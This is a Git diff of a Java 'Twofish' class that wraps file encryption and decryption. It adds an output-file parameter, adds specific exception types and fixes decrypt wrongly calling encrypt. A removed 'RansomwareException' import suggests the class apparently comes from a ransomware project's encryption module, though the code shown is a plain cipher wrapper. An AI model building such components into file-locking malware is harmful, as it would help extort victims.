@@ -5,30 +5,49 @@ import java.io.File;
 import javax.crypto.SecretKey;
 
 import Agent.Utils.JavaCryptoUtil;
+import Agent.exceptions.AlgorithmNotFoundException;
 import Agent.exceptions.CryptoException;
-import Agent.exceptions.RansomwareException;
+import Agent.exceptions.InOutException;
+import Agent.exceptions.KeyNotFoundException;
+import Agent.exceptions.PaddingException;
 
 public class Twofish implements CryptoAlgorithm {
 
-
 	@Override
-	public void encrypt(SecretKey skey, File fileToEncrypt) throws RansomwareException {
-
+	public void encrypt(SecretKey skey, File fileToEncrypt, File outputFile)
+			throws AlgorithmNotFoundException, PaddingException, KeyNotFoundException, CryptoException, InOutException {
 		try {
-			JavaCryptoUtil.encrypt(skey, fileToEncrypt, CHANGENAME.encryptedOutputFile(fileToEncrypt), "twofish");
+			JavaCryptoUtil.encrypt(skey, fileToEncrypt, outputFile, "twofish");
+		} catch (AlgorithmNotFoundException e) {
+			throw new AlgorithmNotFoundException();
+		} catch (PaddingException e) {
+			throw new PaddingException();
+		} catch (KeyNotFoundException e) {
+			throw new KeyNotFoundException();
 		} catch (CryptoException e) {
-			throw new CryptoException("problem with encrypting", e.getCause());
+			throw new CryptoException("problem encrypting file");
+		} catch (InOutException e) {
+			throw new InOutException();
 		}
 
 	}
 
 	@Override
-	public void decrypt(SecretKey skey, File fileToDecrypt) throws RansomwareException {
-
+	public void decrypt(SecretKey skey, File fileToDecrypt, File outputFile)
+			throws AlgorithmNotFoundException, PaddingException, KeyNotFoundException, CryptoException, InOutException {
 		try {
-			JavaCryptoUtil.encrypt(skey, fileToDecrypt, CHANGENAME.decryptedOutputFile(fileToDecrypt),"twofish");
+			JavaCryptoUtil.decrypt(skey, fileToDecrypt, outputFile, "twofish");
+		} catch (AlgorithmNotFoundException e) {
+			throw new AlgorithmNotFoundException();
+		} catch (PaddingException e) {
+			throw new PaddingException();
+		} catch (KeyNotFoundException e) {
+			throw new KeyNotFoundException();
 		} catch (CryptoException e) {
-			throw new CryptoException("problem with decrypting", e.getCause());
+			throw new CryptoException("problem decrypting file");
+		} catch (InOutException e) {
+			throw new InOutException();
 		}
+
 	}
 }
